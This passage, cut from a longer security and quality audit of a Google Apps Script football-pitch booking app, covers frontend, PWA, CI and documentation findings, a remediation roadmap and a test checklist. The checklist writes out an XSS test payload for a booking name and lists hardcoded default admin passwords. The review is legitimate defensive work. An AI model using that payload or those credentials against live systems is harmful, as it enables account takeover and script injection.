**Fix:** Skip reminder/phone links for `Source='Maintenance'` or a dedicated block flag; render a distinct maintenance card.

### P2-20 — Report/email semantics are ambiguous and unescaped
**Files:** `Reports.gs:87-94, 147-160`

No-show revenue counts only the deposit; cancellation with a non-refunded deposit is not counted at all; confirmed revenue includes the full price even if cash was not collected yet. The email injects `pl.name` and `settings.stadiumName` into HTML without escaping (HTML injection/phishing formatting, P2-*). The "confirmed matches" count includes blocks (P2-08).

**Fix:** Define and document revenue recognition rules (booked vs collected vs no-show forfeiture), add a `Refund`/`Collected` column if needed, and escape all interpolated values. Cap utilization.

---

# Phase 3 — Player and admin frontend

## CRITICAL

### P3-01 — Admin dashboard XSS via player name (same root cause as P1-02)
**Files:** `Admin.html:684-697`, `AdminApi.gs:55-75`, `Code.gs:411-517`

This is the frontend half of P1-02. `renderMatchList` builds cards with template literals and `card.innerHTML`; `m.playerName` is completely unescaped. `m.status`, `m.timeSlot`, and `m.remainingCash` are also interpolated (the latter is a number, but the first two come from the sheet). Since `ADMIN_KEY` lives in `sessionStorage`, the payload can read and exfiltrate it.

**Fix:** Escape every interpolated value, or build DOM nodes with `textContent`. Add a lint rule/review checklist for `innerHTML` with dynamic data. Consider a CSP on the Apps Script page (limited) and a strict `escapeHtml` helper.

## HIGH

### P3-02 — Admin "logout" is ineffective when the URL contains the key
**Files:** `Admin.html:493, 531-532, 567-571`, `Code.gs:30`

`logoutAdmin` clears session storage and the in-memory key, but the URL still has `?page=admin&key=…`; a reload re-authorizes and re-embeds the key. The owner may believe they logged out on a shared device while the bookmark/browser history still grants access.

**Fix:** On login/logout, strip the key from the URL with `history.replaceState` and require the login form for subsequent sessions. Implement server-side session revocation for a real logout. At minimum, show a warning that closing the tab is required.

### P3-03 — Admin API wrapper has no timeout; UI can hang forever
**Files:** `Admin.html:582-588` (compare `Index.html:1255-1278`)

The player app wraps `google.script.run` with a 25 s timeout; the admin app does not. If Apps Script is slow or the call never resolves, the login/dashboard buttons stay disabled and the owner has no feedback.

**Fix:** Reuse the same `api()` wrapper (timeout, failure handler, friendly message) in both pages. Reset button state in `finally`.

### P3-04 — Admin default date uses UTC; can be the wrong day in Cairo
**Files:** `Admin.html:590-594`

`new Date().toISOString().split('T')[0]` is UTC. Between 00:00 and 02:00 Cairo (UTC+2/3 depending on DST), the date can be the previous day, so the manual booking form defaults to yesterday and `refreshAdminSlots` returns an out-of-range error.

**Fix:** Ask the server for `todayStr()` (already returned in bootstrap or add an admin bootstrap), or format with the Cairo timezone. Do not use `toISOString` for local dates.

### P3-05 — Player UI has no request sequencing; rapid date/pitch changes can render stale slots
**Files:** `Index.html:1353-1437`

`selectDate`/`switchPitch` call `loadSlots()` without cancelling or tagging the in-flight request. If the user taps several dates quickly, a slower earlier response can overwrite the grid with slots for a different date/pitch. The counter badge also updates from the stale response.

**Impact:** A player sees/picks a slot that belongs to another date; the booking may then fail or book the wrong displayed context (the payload uses current state, so the displayed slot may not match the submitted date).
**Fix:** Keep a monotonically increasing request ID and ignore responses that are not the latest; disable the grid while loading or visually mark it. Alternatively, abort previous requests (not possible with `google.script.run`, so use the ID).

## MEDIUM

### P3-06 — Status CSS classes never match for Pending Deposit (and Cancelled/Expired)
**Files:** `Index.html:939-941, 1780`, `Admin.html:202-205, 687`

The code builds `status-${b.status.replace(/\s+/g, '')}` → `status-PendingDeposit`, but CSS defines `.status-Pending` (player) and `.status-Pending` (admin). `Owner Reserved` matches (`status-OwnerReserved`), `No-Show` matches, `Confirmed` matches; `Pending Deposit`, `Cancelled`, `Expired` have no style. Pending bookings — the ones that most need attention — render as plain text.

**Fix:** Define classes for `PendingDeposit`, `Cancelled`, `Expired`, `Available`, or use a mapping function `statusClass(status)` shared by both pages.

### P3-07 — Countdown hardcodes 15 minutes in messages while the setting is configurable
**Files:** `Index.html:1140, 1727-1729`, `Code.gs:588`

The pending screen says "15 دقيقة" and the expiry toast says "(15 دقيقة)" even if `Lock_Minutes` is 30 or 5. The server returns `p.lockMinutes`, but the UI ignores it.

**Fix:** Use `p.lockMinutes`/`initData.lockMinutes` in all messages and the initial HTML placeholder; update the text when the pending response arrives.

### P3-08 — Expired countdown does not refresh the slot grid
**Files:** `Index.html:1723-1730`

When the timer reaches zero, it shows a toast saying the slot was released, but the grid still shows the slot as taken until the user changes date/tab or manually retries. The state is misleading.

**Fix:** Call `loadSlots()` when the countdown expires, and close/disable the deposit step.

### P3-09 — Player client rejects phone formats the server supports
**Files:** `Index.html:1043, 1094, 1511, 1747`

`submitPhoneStep` requires exactly 11 chars starting with `01`, and the inputs have `maxlength="11"`. The server supports `+20…`, `0020…`, spaces/dashes, and Arabic-Indic digits, but the client blocks them before normalization. Pasting an international number silently truncates to 11 chars and fails.

**Fix:** Let the server normalize/validate; on the client, strip spaces/dashes and allow 10–14 chars, or use `inputmode="tel"` and a lenient regex. Show the normalized number after validation. Do the same in the "My Bookings" tab.

### P3-10 — `copyText` has no fallback and no error handling
**Files:** `Index.html:1291-1296`

`navigator.clipboard.writeText` requires a secure context/permission and can reject. There is no `.catch`, so the user gets no feedback and an unhandled rejection is logged. Inside an iframe, permission can be denied.

**Fix:** Add a `try/catch` and a `document.execCommand('copy')` fallback (or show the text for manual copy). Use `showToast` on failure.

### P3-11 — `toast` timers race and can hide newer messages
**Files:** `Index.html:1280-1288`, `Admin.html:575-580`

Each toast schedules a timeout that clears the class/display unconditionally. A second toast within 3.5 s can be hidden early by the first timeout. `Admin.html` also uses a fixed 3 s.

**Fix:** Store the timeout ID, clear it before showing a new toast, or compare a message/sequence token.

### P3-12 — Player phone is persisted in `localStorage` indefinitely
**Files:** `Index.html:1301-1305, 1517`

The phone number (PII) is stored in plaintext on the device and pre-filled in both forms. On a shared/family device this exposes the number and makes accidental account actions easier. There is no consent/clear option.

**Fix:** Use `sessionStorage` by default, or store only after an explicit "remember me" checkbox; add a clear button. Do not prefill the admin or sensitive forms.

### P3-13 — Accessibility: no keyboard support for card/chip buttons; zoom disabled
**Files:** `Index.html:5, 1338-1350, 1406-1431`, `Admin.html:5`

`<div class="day-chip">` and `<div class="slot-card">` have `onclick` but no `role="button"`, `tabindex`, or key handlers, so keyboard/screen-reader users cannot book. `maximum-scale=1, user-scalable=no` disables pinch zoom.

**Fix:** Use `<button>` elements (or add role/tabindex/keydown), visible focus styles, `aria-label`s, and remove `user-scalable=no`/`maximum-scale` (keep responsive layout). Ensure contrast ratios.

### P3-14 — Admin dashboard has no way to search/filter bookings or see pending details
**Files:** `Admin.html:417-489, 634-701`

The owner can only see today/tomorrow, cannot search by name/phone/date, and cannot inspect a booking's full history/notes. Combined with P2-04, this forces manual sheet work.

**Fix:** Add a search box and date range, a pending-deposits list, and a booking detail view (status history, deposit, source, notes).

### P3-15 — Admin status actions are missing for common cases
**Files:** `Admin.html:660-681`

Confirmed bookings only offer "No-Show" (no "Cancel"), pending only "Confirm/Cancel", and there is no undo for a mistaken No-Show. The backend supports `Cancelled` and `revertBookingNoShow` (via status change), but the UI does not expose it.

**Fix:** Add "Cancel" for confirmed bookings with a reason, and "Undo No-Show" that calls a dedicated endpoint (not a raw status string) which restores the prior status and decrements the penalty (P2-06).

### P3-16 — Inline `onclick` with interpolated phone/PIN/bookingId is fragile
**Files:** `Index.html:1774`

`onclick="triggerCancelBooking('${phone}', '${pin}', '${b.bookingId}')"` embeds credentials into HTML. Today the values are constrained, but the pattern is an injection magnet and leaks the PIN into the DOM/history/DevTools. It also breaks if a value ever contains a quote.

**Fix:** Render a button with `dataset` attributes or attach an event listener closure, and keep the PIN only in JS state (never in markup). Validation should reject non-digits.

## LOW

### P3-17 — Repeated base64 logo inflates HTML and bypasses caching
**Files:** `Index.html:7, 982`, `Admin.html:352, 379`

The same ~30 KB+ base64 PNG is embedded twice per page (favicon + header) and again in Admin, adding substantial render-blocking bytes and duplicating data. The PWA has optimized files in `public/images` but the Apps Script pages don't use them.

**Fix:** Serve a small logo file (or use the existing `public/images/sansiro_logo_low.png`) and reference it with a normal URL; keep one small favicon. Consider a single SVG mark.

### P3-18 — PWA install banner overlaps the in-iframe bottom navigation
**Files:** `public/index.html:150-173, 392-404`, `Index.html:1060-1069`

The banner is `position: fixed; bottom: 16px` in the parent, while the player app has its own fixed bottom nav at `bottom: 16px` inside the iframe. The banner covers the nav until dismissed. On desktop, the fallback shows iOS instructions, which is confusing.

**Fix:** Show the banner as a top sheet, add bottom padding to the iframe/app while the banner is visible, and tailor the fallback text to the detected platform (Android/desktop vs iOS).

### P3-19 — Client-side state/messages are not reset consistently
`closeModal`/`resetModalSteps` clears PIN fields but not `state.customerState`, `state.verifiedPhone`, `countdownDisplay`, or the setup/new-customer inputs. Reopening the modal can show a stale name/state or a previous countdown message until overwritten. Minor UX/security (stale name in the DOM).

**Fix:** Reset all modal fields and state in one `resetBookingState()` function; clear sensitive inputs after use.

### P3-20 — `admin` login hint and default password (UI half of P1-01)
`Admin.html:368-371` prints `sansiro2026` on the public login screen and tells the owner to change it in the sheet. This both leaks the default and becomes stale/wrong after a change.

**Fix:** Remove the hint entirely; show a setup instruction only when no password is configured (server-detected), and never print a secret.

### P3-21 — The "install admin app" flow installs the booking app
**Files:** `public/manifest.json:5`, `Admin.html:552-558`, `public/index.html:560-575`

There is one manifest with `start_url: "/"`. From the admin iframe, "تثبيت التطبيق" posts `TRIGGER_INSTALL` and the wrapper installs the same manifest; opening the installed icon goes to the booking page, not the admin page. The owner cannot have a separate admin home-screen app with this design.

**Fix:** Either create a separate `manifest-admin.json`/scope (e.g. `/admin?page=admin`) with a dedicated start URL, or relabel the admin button as "install booking app" and document that the admin page is opened via bookmark. Never put the admin key in the manifest.

### P3-22 — `renderMatchList` legend/title logic is fine, but status/action mismatch for canceled rows
The list shows cancelled/no-show rows with no actions, which is acceptable, but the KPI "مباريات اليوم" counts only Confirmed/Owner Reserved while the list includes all rows; the count and list can disagree. Minor UX confusion.

**Fix:** Align the list filter with the KPI or label the count "confirmed matches" explicitly.

---

# Phase 4 — PWA, infrastructure, CI, docs

## HIGH

### P4-01 — Service worker cache-first strategy can pin users to a stale app forever
**Files:** `public/sw.js:2, 34-49`, `public/index.html:435-441`

Every same-origin GET is served `cache-first`. `/` (the HTML shell) is cached under a fixed `CACHE_NAME` (`sansiro-cache-v1`). If `public/index.html` is updated but `sw.js` is unchanged, no new install occurs, so returning users keep the old shell indefinitely. There is no network-first/update strategy or version bump automation. The offline fallback returns `/` (HTML) for any failed asset, which can serve HTML where an image/JS was expected.

**Impact:** Deployments don't reach returning players; bugs/security fixes appear not to apply.
**Fix:** Use `network-first` for navigation/HTML, `stale-while-revalidate` for static assets, bump `CACHE_NAME` per deploy, and fall back only to a dedicated offline page. Add a `skipWaiting`/`clients.claim` flow (already partly present) and test an update. Also ensure `sw.js` itself is served with no-cache headers.

### P4-02 — Vercel wrapper hardcodes a single `/exec` deployment URL
**Files:** `public/index.html:443`

`BASE_APPS_SCRIPT_URL` is a literal Apps Script URL. Redeploying the web app (new deployment) or switching accounts breaks the production wrapper with no error; the iframe silently fails and the loader hides after 2.5 s. The URL is also committed, so forks point at the original deployment.

**Impact:** Outage on redeploy; test/prod confusion; forks silently book against the wrong backend.
**Fix:** Make the URL a build-time env var (Vercel `NEXT_PUBLIC_*`/static replacement) or a small `/config.json` that can be changed without rebuilding. Validate the iframe load and show an error if it fails. Document the update step in README.

## MEDIUM

### P4-03 — CI installs an unpinned global `clasp` and deploys without tests
**Files:** `.github/workflows/deploy.yml:22-23, 39-50`

`npm install -g @google/clasp` has no version pin; a breaking release can break deployments without a code change. The workflow pushes/deploys on every push to `main` with no lint/test gate, no `clasp status`/type check, and no concurrency control (two pushes can race). The `Set Custom Script ID` step's `if: ${{ env.CUSTOM_SCRIPT_ID != '' }}` with `CUSTOM_SCRIPT_ID` defined only in the same step's `env` is fragile — verify it actually runs; if not, the secret is ignored.

**Impact:** Unreproducible/broken deploys; untested changes reach production; race conditions.
**Fix:** Pin `@google/clasp@2.x` (and commit a lockfile/`npx`), add a `concurrency` group, run at least a syntax/ESLint/test job (or `runSelfTests` via a manual gate), and move `CUSTOM_SCRIPT_ID` to a workflow-level `env` or use `secrets.SCRIPT_ID` directly in `run` (not `if`). Add a deployment smoke test (open the web app / check version).

### P4-04 — Security headers are minimal; no CSP/HSTS/permissions policy
**Files:** `vercel.json:4-12`

Only `X-Content-Type-Options` and `Referrer-Policy` are set. No `Content-Security-Policy` (the wrapper loads Google Fonts and an Apps Script iframe), no `Strict-Transport-Security`, no `Permissions-Policy`, no `X-Frame-Options` (deliberate for the iframe, but the wrapper itself can be framed).

**Impact:** XSS impact is larger (no CSP), clickjacking of the wrapper, and weaker transport protections.
**Fix:** Add a CSP allowing `script.google.com`/`script.googleusercontent.com` (frame-src), `fonts.googleapis.com`/`fonts.gstatic.com` (style/font), `'self'` for scripts/styles, and `frame-ancestors 'none'` on the wrapper (while still allowing the iframe child). Add HSTS and a permissions policy. Test the Apps Script iframe behavior.

### P4-05 — Manifest icons declare sizes that may not match the files; single manifest for two apps
**Files:** `public/manifest.json:13-24`

Both 192 and 512 entries point to the same `sansiro_logo.png`; check the actual dimensions. Chrome installability expects a 192 and a 512 icon with correct declared sizes; a mismatch can fail or render blurry. `purpose: "any maskable"` on the same image without a safe-zone design may crop the logo. The single manifest also causes P3-21.

**Impact:** Install prompt may not appear or the icon looks wrong; admin install goes to the wrong page.
**Fix:** Export proper 192×192 and 512×512 (and a maskable variant with padding), declare each separately, add `sizes: "any"` for SVG if used. Consider a separate admin manifest.

### P4-06 — Static wrapper adds an iframe but no resilience/error state
**Files:** `public/index.html:464-465, 554-575`

The loader is hidden after 2.5 s even if the iframe failed (offline, Google outage, bad URL). There is no retry/error message; users see a blank green page. The `message` listener does not verify `event.origin`, so any embedding page can trigger install banners or the iOS modal (low impact, but sloppy). `closeIosModal` uses `e.target.tagName === 'BUTTON'`, which closes the modal when the inner "فهمت" button is clicked (intended) but also any button inside — currently none.

**Impact:** Silent failure and confusing blank screen; minor cross-origin message trust.
**Fix:** Add a load timeout/error message with a retry button; verify `event.origin === 'https://script.google.com'` (and the `googleusercontent` origin as appropriate) before handling messages; use explicit close buttons.

## LOW

### P4-07 — `.claspignore`/`.clasp.json` fragility
**Files:** `.claspignore:1-13`, `.clasp.json:1-4`

The ignore file whitelists `!*.gs` at the root only; adding a `.gs` in a subfolder (e.g. `src/`) silently won't deploy. The committed `scriptId` is environment-specific; the README doesn't explain how to change it for a fork. The CI `Set Custom Script ID` step may be a no-op (P4-03).

**Fix:** Document fork setup; use a `clasp` project per environment; consider a `src/` layout if the code grows. Add a CI check that the pushed files match expectations.

### P4-08 — Docs are stale and contradict the code
**Files:** `README.md:34-51, 135-158`, `TASKS.md:12-28, 139-161`

The README lists `Admin.gs` (actual: `AdminApi.gs`), omits `public/`, `.github/`, `vercel.json`, and shows Windows-specific paths. The settings table says `Close_Hour` 26, while the sheet default is `02:00 AM`; both are valid but the README doesn't explain the Date/time parsing risk (P1-13). `TASKS.md` claims 100% completion and "zero hardcoded secrets" — contradicted by the hardcoded default passwords (P1-01). The deployment guide doesn't mention the Vercel wrapper/PWA, CI secrets, or the new admin API.

**Impact:** New maintainers follow wrong instructions; security claims are misleading.
**Fix:** Regenerate the structure and deployment sections, document the env/secrets, add the PWA steps, and replace "100% complete/zero secrets" with an honest status. Add a `SECURITY.md` with the key handling model.

### P4-09 — No local test/lint harness
**Files:** repo root

Nothing can run locally: GAS `.gs` files depend on Google services, and there is no `package.json`, ESLint, Prettier, or a mocked test runner. `Tests.gs` is a manual in-Sheets self-test; it doesn't test the booking flow, admin auth, date boundaries, or the UI. CI cannot catch regressions.

**Impact:** High regression risk; every deploy is manual verification.
**Fix:** Extract pure functions (date/phone/pricing) into modules that can run under Node with mocks; add a minimal `package.json` + Vitest/Jest for those, and an ESLint config for `.gs`/HTML scripts. Keep `runSelfTests` for integration smoke tests. At minimum, add a CI syntax check (`clasp` push to a test project or a custom parser).

### P4-10 — No `LICENSE`, `SECURITY.md`, or contribution guide
The repo is a business app but has no license/ownership statement and no disclosure process for security issues.

**Fix:** Add a private/proprietary license note (or the intended license), a `SECURITY.md` (how to report, key rotation), and a short `CONTRIBUTING.md` (setup, deploy, review).

### P4-11 — `.vercel`/root `images/` duplication and unreferenced assets
**Files:** root `images/`, `public/images/`, `.vercel/`

There is a root `images/` folder and a `public/images/` folder; the root one is not used by the Vercel build and duplicates ~350 KB. `.vercel/` may contain local project linkage (ignored by git). No build step prunes unused assets.

**Fix:** Keep only `public/images/`, remove duplicates, and add a build/audit step. Confirm `.vercel/` is ignored and not committed.

### P4-12 — No monitoring/alerting for trigger failures or quota exhaustion
`releaseExpiredLocks`/`sendMonthlyEmailSummary` only log. If a trigger fails or a quota is hit, no one is notified; pending locks stay locked and the monthly email silently doesn't send. Stackdriver has no alert policy defined.

**Fix:** On repeated failures, send an email/WhatsApp alert to the owner; add a heartbeat (last successful run timestamp) shown in the admin dashboard; use `console.error` for Stackdriver.

### P4-13 — Timezone mismatch between manifest and project settings is unchecked
`appsscript.json` sets `Africa/Cairo`, but Apps Script project settings can differ; all date/booking logic assumes they match. There is no startup guard.

**Fix:** Add a `selfCheck()` (run in setup and on a daily trigger) that compares `Session.getScriptTimeZone()`/`SpreadsheetApp.getActiveSpreadsheet().getSpreadsheetTimeZone()` to `TIMEZONE_CAIRO` and alerts on mismatch. Document it.

### P4-14 — Documentation of the booking rules is incomplete for operators
The README explains the happy path but not: expired pending rows, admin overrides, maintenance blocks vs matches, report definitions, how to change the admin key safely, what happens to existing PINs if the salt changes, or how to restore a backup without ID collisions. (`README.md` overall is good but operationally incomplete.)

**Fix:** Add an "Operations runbook" section covering these cases, plus a "Disaster recovery" section (restore, rotate keys, reset PINs, reinstall triggers).

---

# Cross-cutting observations

## What is done well

- **Clear module boundaries** and header comments; constants (`SHEETS`, `COL`, `STATUS`, `PITCHES`) avoid magic numbers in most places.
- **`LockService`** around booking/cancel/admin writes is the right primitive for GAS; the intent is correct even though the scope is broader than necessary.
- **Salted SHA-256 PIN hashing**, constant-time comparison, weak-PIN blacklist, and a rate limiter show security awareness.
- **Structured response envelopes** (`ok`, `code`, `message`) and Arabic user-facing errors.
- **Settings in a sheet** with cache, a setup/repair routine, triggers installation, and a custom menu is a pragmatic GAS architecture.
- **Self-tests** cover phone normalization, date formatting, pricing, discounts, and crypto basics.
- **UI** is cohesive, RTL, mobile-first, with good visual hierarchy and a consistent design system.
- **README** is thorough for the initial deployment and daily owner routine.

## Systemic patterns that should change

1. **Client trust:** The server accepts too many values from the client (slot label, name, price, status strings) without canonical validation. Establish a "the client only sends IDs/choices; the server recomputes everything" rule.
2. **Duplicated occupancy logic:** Three copies of the "is this slot taken" loop already drift (expired lock handling). Extract one `SlotService`.
3. **Side effects are not idempotent:** Customer stats increment on every call. Derive stats from bookings or make them transition-based.
4. **No transaction boundaries:** GAS has no transactions; use append-only writes for the critical record, best-effort side effects, and idempotency keys.
5. **Unescaped dynamic HTML:** Every `innerHTML` with sheet/user data is a potential stored XSS. Adopt `textContent`/`escapeHtml` as a hard rule.
6. **Secrets in URLs and storage:** Move to a session token; rotate keys; never log them; never hardcode defaults.
7. **Silent catches:** `catch (e) { Logger.log(...) }` in triggers hides data corruption. Return a result, alert on repeated failures, and surface a health status.
8. **No executable tests/CI gate:** Add a local harness for pure logic and a syntax check in CI.

---

# Prioritized remediation roadmap

## Sprint 1 — security stop-the-bleeding (do before any public use)

1. P1-01 Remove fallback passwords + password hint; rate-limit `verifyAdminKey`; fail closed.
2. P1-02/P3-01 Escape all admin dashboard output (and email); add server-side name length/character limits.
3. P1-03 Remove name/status from `lookupCustomer`; require PIN or a challenge.
4. P1-04 Remove the key from the URL after load; implement server-side sessions/real logout; rotate the key.
5. P1-05 Fix `Remaining_Cash` (one writer, clamp at 0).
6. P1-06/P2-10 Server-side slot validation (player + admin) and reject past slots.

## Sprint 2 — core correctness

7. P2-01/P2-05 Prevent confirming an expired/rebooked slot; unify occupancy rules and clean stale rows.
8. P2-03 Fix the pre-opening "today" filter.
9. P2-04 Show pending deposits for all dates in the admin UI.
10. P2-06/P2-07 Make customer stats idempotent; lock/guard `onEditTrigger`; only act on transitions.
11. P2-02 Money arithmetic: clamp, single source, no `||` fallback on 0.
12. P1-08 Idempotent booking + best-effort side effects.

## Sprint 3 — robustness & operations

13. P1-13/P1-14/P2-16 Date/time parsing and timezone guards; self-check.
14. P1-09/P1-10/P1-15/P1-16 Key/salt/password storage and rotation; per-user PIN salt/KDF.
15. P2-08/P2-09 Report definitions, maintenance blocks, hours; align email and sheet.
16. P2-14/P2-15/P2-13 Performance and abuse controls (cache/index, limit pending bookings, rate limits).
17. P4-01/P4-02 PWA update strategy and configurable backend URL.
18. P4-03/P4-09 CI: pin clasp, add syntax/lint/pure-logic tests, concurrency.

## Sprint 4 — polish

19. P3-06…P3-16 UX fixes (CSS classes, countdown, request sequencing, accessibility, admin actions/search).
20. P4-04…P4-14 headers, manifest icons, docs/runbook, monitoring, dead code, asset cleanup.

---

# Appendix A — Quick verification checklist after fixes

- [ ] `?page=admin` without a key shows only a login form; `admin123`/`1234`/`sansiro2026` are rejected after the password is changed.
- [ ] Logging out and reloading does not restore admin access.
- [ ] A booking name `<img src=x onerror=alert(1)>` renders as text in the admin dashboard and in the monthly email.
- [ ] `lookupCustomer` returns no name before PIN verification.
- [ ] Booking a slot string not in the generated list is rejected.
- [ ] Booking a past slot today is rejected.
- [ ] Two players cannot end up Confirmed on the same pitch/date/slot (test expired-lock + admin confirm).
- [ ] `Remaining_Cash` is numeric (no `#REF!`) for every row; K is 0 when price == deposit; no negative.
- [ ] At 01:00, today's 14:00 slots are visible and bookable.
- [ ] Pending deposits for a date 3 days out are visible and confirmable in the admin UI.
- [ ] A confirmed booking's `TOTAL_BOOKINGS` increments exactly once after status toggles.
- [ ] `Close_Hour` entered as a time value (02:00 AM) still yields a full slot grid.
- [ ] Changing `Admin_Password` invalidates the old password immediately.
- [ ] `installTriggers` shows exactly 3 triggers; `releaseExpiredLocks` runs every 5 min.
- [ ] PWA update: change `public/index.html`, reload twice, see the new version; offline shows a proper message.
- [ ] CI deploy pins `clasp`, uses the intended script ID, and fails on a broken `.gs` syntax.
- [ ] `runSelfTests` passes; add cases for Date settings, pre-opening slots, multi-row edits, and idempotency.

# Appendix B — Files reviewed

| File | Lines (reviewed) | Phase |
|---|---:|---|
| `Code.gs` | 820 | 1, 2 |
| `Config.gs` | 605 | 1 |
| `Security.gs` | 335 | 1 |
| `AdminApi.gs` | 368 | 2 |
| `Pricing.gs` | 211 | 2 |
| `Reports.gs` | 271 | 2 |
| `Triggers.gs` | 239 | 2 |
| `Setup.gs` | 683 | 2, 4 |
| `Tests.gs` | 196 | 4 |
| `Index.html` | 1,826 | 3 |
| `Admin.html` | 841 | 3 |
| `public/index.html` | 590 | 4 |
| `public/sw.js` | 50 | 4 |
| `public/manifest.json` | 26 | 4 |
| `appsscript.json` | 16 | 1, 4 |
| `vercel.json` | 13 | 4 |
| `.github/workflows/deploy.yml` | 50 | 4 |
| `.clasp.json`, `.claspignore`, `.gitignore` | — | 4 |
| `README.md` | 187 | 4 |
| `TASKS.md` | 161 | 4 |

**End of report.**
